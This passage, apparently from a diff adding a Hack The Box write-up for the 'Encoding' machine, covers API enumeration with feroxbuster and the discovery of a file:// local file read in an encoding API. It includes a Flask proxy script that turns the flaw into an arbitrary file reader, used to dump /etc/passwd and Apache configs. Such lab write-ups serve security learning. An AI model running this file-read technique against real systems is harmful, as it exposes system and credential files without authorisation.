+--1c2d49b3b9286f33ea5a1aeb8e8e3843--
+</code></pre></div></div>
+<p>This is weird, but not important for solving the box.</p>
+<h4 id="url">URL</h4>
+<p>The last example shows giving a URL instead of data:</p>
+<div class="language-python wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">action</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">str2hex</span><span class="sh">'</span><span class="p">,</span>
+     <span class="sh">'</span><span class="s">file_url</span><span class="sh">'</span> <span class="p">:</span> <span class="sh">'</span><span class="s">http://example.com/data.txt</span><span class="sh">'</span>
+<span class="p">}</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ll create a simple text file named <code class="language-plaintext highlighter-rouge">test.txt</code> and host it with a Python webserver. I’ll send the URL for that file to this endpoint:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">str2hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://10.10.14.6/test.txt</span><span class="sh">"</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+</code></pre></div></div>
+<p>It works. It gets a 200 response. There is also a hit on my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.198 - - [11/Apr/2023 14:31:47] "GET /test.txt HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>The response body shows the returned data, hex-encoded:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="go">{'data': '746573740a'}
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">xxd</code> to verify this is the same data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"746573740a"</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+<span class="go">test
+</span></code></pre></div></div>
+<h4 id="brute-force">Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> on this site as well. I typically run with <code class="language-plaintext highlighter-rouge">-m GET,POST</code> for APIs, but it doesn’t show anything additional here, so for the sake of cleanliness, I’ll show just GET requests. I also typically wouldn’t include an extension for an API, but I’ve already seen this one has <code class="language-plaintext highlighter-rouge">.php</code> extensions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://api.haxtables.htb <span class="nt">-x</span> php 
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://api.haxtables.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      282c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      279c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        1l        3w       16c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/utils.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      319c http://api.haxtables.htb/v2 =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v2/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/v2/header.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      325c http://api.haxtables.htb/v2/tools =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v2/tools/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      319c http://api.haxtables.htb/v1 =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v1/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      319c http://api.haxtables.htb/v3 =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v3/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/string/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/string/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      332c http://api.haxtables.htb/v1/tools/string =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v1/tools/string/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      333c http://api.haxtables.htb/v1/tools/integer =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v1/tools/integer/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      333c http://api.haxtables.htb/v3/tools/integer =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v3/tools/integer/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/integer/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/integer/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      332c http://api.haxtables.htb/v3/tools/string =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v3/tools/string/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/string/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v1/tools/integer/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/integer/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://api.haxtables.htb/v3/tools/string/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/v1/tools/string/utils.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/v1/tools/integer/utils.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://api.haxtables.htb/v3/tools/string/utils.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      332c http://api.haxtables.htb/v2/tools/string =&gt; </span><span class="feroxbuster-yellow">http://api.haxtables.htb/v2/tools/string/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       14w      108c http://api.haxtables.htb/v2/tools/string/
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 5m    301089/301089  0s      </span><span class="feroxbuster-green">found</span><span class="go">:27      </span><span class="feroxbuster-red">errors</span><span class="go">:180117 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   189/s   http://api.haxtables.htb/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://api.haxtables.htb/v2/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   187/s   http://api.haxtables.htb/v2/tools/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://api.haxtables.htb/v1/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://api.haxtables.htb/v3/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://api.haxtables.htb/v1/tools/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://api.haxtables.htb/v3/tools/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   186/s   http://api.haxtables.htb/v1/tools/string/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   186/s   http://api.haxtables.htb/v1/tools/integer/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   185/s   http://api.haxtables.htb/v3/tools/string/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   185/s   http://api.haxtables.htb/v3/tools/integer/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 3m     43008/43008   191/s   http://api.haxtables.htb/v2/tools/string/ 
+</span></code></pre></div></div>
+<p>One thing that immediately jumped out is that not only <code class="language-plaintext highlighter-rouge">/v3</code>, but <code class="language-plaintext highlighter-rouge">/v1</code> and <code class="language-plaintext highlighter-rouge">/v2</code> seem to exist with the same endpoints. This is really just a rabbit hole.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="file-read">File Read</h3>
+<h4 id="enumerate-requests">Enumerate Requests</h4>
+<p>I’m curious to see how the PHP server is making the request to get the file from a given URL. I’ll use <code class="language-plaintext highlighter-rouge">nc</code> to listen on 80 and get it to make the same request to me again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 80
+<span class="go">Listening on 0.0.0.0 80
+Connection received on 10.10.11.198 56144
+GET /test.txt HTTP/1.1
+Host: 10.10.14.6
+Accept: */*
+</span></code></pre></div></div>
+<p>No User-Agent string.</p>
+<h4 id="ssrf-failsort-of">SSRF [Fail…Sort Of]</h4>
+<p>I wasn’t able to read anything from <code class="language-plaintext highlighter-rouge">image.haxtables.htb</code> from my host. It’s worth trying to see if I can reach it via the website functionality. If I can exploit anything there, that would be a server-side request forgery (SSRF).</p>
+<p>Unfortunately, it replies that <code class="language-plaintext highlighter-rouge">http://127.0.0.1/index.php</code> is an “Unacceptable URL”:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">str2hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1/index.php</span><span class="sh">"</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="go">{'message': 'Unacceptable URL'}
+</span></code></pre></div></div>
+<p>I’ll check <code class="language-plaintext highlighter-rouge">http://image.haxtables.htb</code> as well, with the same result:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">str2hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://image.haxtables.htb/</span><span class="sh">"</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="go">{'message': 'Unacceptable URL'}
+</span></code></pre></div></div>
+<p>It turns out there’s a bypass here, which I only discovered after solving and chatting about the box with IppSec. I’ll talk about that in <a href="#beyond-root">Beyond Root</a>.</p>
+<h4 id="local-file-read">Local File Read</h4>
+<p>Given that the site is parsing URLs, I’ll try the <code class="language-plaintext highlighter-rouge">file://</code> <a href="https://blog.hubspot.com/marketing/parts-url">scheme</a> to see if it can read files from disk. It can!</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">str2hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">file:///etc/hostname</span><span class="sh">"</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="go">{'data': '656e636f64696e670a'}
+</span></code></pre></div></div>
+<p>That decodes to “encoding”, which makes sense as the hostname:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">"</span><span class="s">656e636f64696e670a</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
+<span class="go">'encoding\n'
+</span></code></pre></div></div>
+<h4 id="make-proxy">Make Proxy</h4>
+<p>I’m going to make a Flask proxy to make reading from the file system easy. I’ll walk through that in <a href="https://www.youtube.com/watch?v=f0m-3P7_bsU">this video</a>:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/f0m-3P7_bsU" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The final script is <a href="https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-encoding/proxy.py">on GitLab</a>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
+
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/&lt;path:file&gt;</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">get_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
+
+    <span class="n">req_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">str2hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_url</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file:///</span><span class="si">{</span><span class="nb">file</span><span class="si">}</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">"</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">req_data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">]),</span> <span class="n">content_type</span><span class="o">=</span><span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+<p>When I run it, it listens on port 5000 such that I can do things like this in another terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://127.0.0.1:5000/etc/hostname
+<span class="go">encoding
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://127.0.0.1:5000/etc/passwd
+<span class="go">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin          
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="filesystem-enumeration">Filesystem Enumeration</h3>
+<h4 id="locate-web-roots">Locate Web Roots</h4>
+<p>With the proxy in place, I’ll start reading files from the filesystem. I’ll see if I can pull the config for Apache, which is by default at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>. It defines three virtual hosts.</p>
+<p>The first is the default, with a web root at <code class="language-plaintext highlighter-rouge">/var/www/html</code>:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        ServerName haxtables.htb
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+                                         
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+<span class="nt">&lt;/VirtualHost&gt;</span>  
+</code></pre></div></div>
+<p>The second is for the API host, with a root at <code class="language-plaintext highlighter-rouge">/var/www/api</code>:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        ServerName api.haxtables.htb
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/api
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</code></pre></div></div>
+<p>The third is for image, which is rooted at <code class="language-plaintext highlighter-rouge">/var/www/image</code>:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+        ServerName image.haxtables.htb
+        ServerAdmin webmaster@localhost
+                         
+        DocumentRoot /var/www/image
+                                         
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+        #SecRuleEngine On
+
+        <span class="nt">&lt;LocationMatch</span> <span class="nt">/&gt;</span>
+                SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
+                SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
+                SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
+                SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
+                Header always set Retry-After "10" env=RATELIMITED
+        <span class="nt">&lt;/LocationMatch&gt;</span>     
+
+        ErrorDocument 429 "Rate Limit Exceeded"
+
+        <span class="nt">&lt;Directory</span> <span class="err">/var/www/image</span><span class="nt">&gt;</span> 
+                Deny from all
+                Allow from 127.0.0.1
+                Options Indexes FollowSymLinks
+                AllowOverride All
+                Require all granted
+        <span class="nt">&lt;/DIrectory&gt;</span>
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</code></pre></div></div>
+<p>This server has a bit more defined. The last section sets it so that any host except for localhost is blocked trying to access this server.</p>
+<h4 id="haxtableshtb">haxtables.htb</h4>
+<p>The main site <code class="language-plaintext highlighter-rouge">index.html</code> has the HTML for the nav bar, and then in the main body has this PHP:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">===</span> <span class="s1">'integer'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/integer.html'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">===</span> <span class="s1">'string'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/string.html'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">===</span> <span class="s1">'image'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/image.html'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">===</span> <span class="s1">'api'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/api.html'</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/index.html'</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">include</span><span class="p">(</span><span class="s1">'./includes/index.html'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>This is a safe <code class="language-plaintext highlighter-rouge">include</code>, as it only includes specific pages.</p>
+<p>I noted <a href="#api-calls">above</a> that conversions were handled by <code class="language-plaintext highlighter-rouge">handler.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include_once</span> <span class="s1">'../api/utils.php'</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'data_file'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$is_file</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span>
+    <span class="nv">$uri_path</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'uri_path'</span><span class="p">];</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'data_file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>
+
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$is_file</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="nv">$jsondata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="nv">$jsondata</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$jsondata</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>
+    <span class="nv">$uri_path</span> <span class="o">=</span> <span class="nv">$jsondata</span><span class="p">[</span><span class="s1">'uri_path'</span><span class="p">];</span>
+
+
+
+    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$jsondata</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'action'</span><span class="p">,</span> <span class="nv">$jsondata</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'uri_path'</span><span class="p">,</span> <span class="nv">$jsondata</span><span class="p">))</span> 
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nf">jsonify</span><span class="p">([</span><span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'Insufficient parameters!'</span><span class="p">]);</span>
+        <span class="c1">// echo jsonify(['message' =&gt; file_get_contents('php://input')]);</span>
+
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$response</span> <span class="o">=</span> <span class="nf">make_api_call</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$uri_path</span><span class="p">,</span> <span class="nv">$is_file</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$response</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>This file organizes the user input and passes it to <code class="language-plaintext highlighter-rouge">make_api_call</code>, which is defined in the included <code class="language-plaintext highlighter-rouge">/var/www/api/utils.php</code>. The function uses curl to make a request at <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code>:</p>
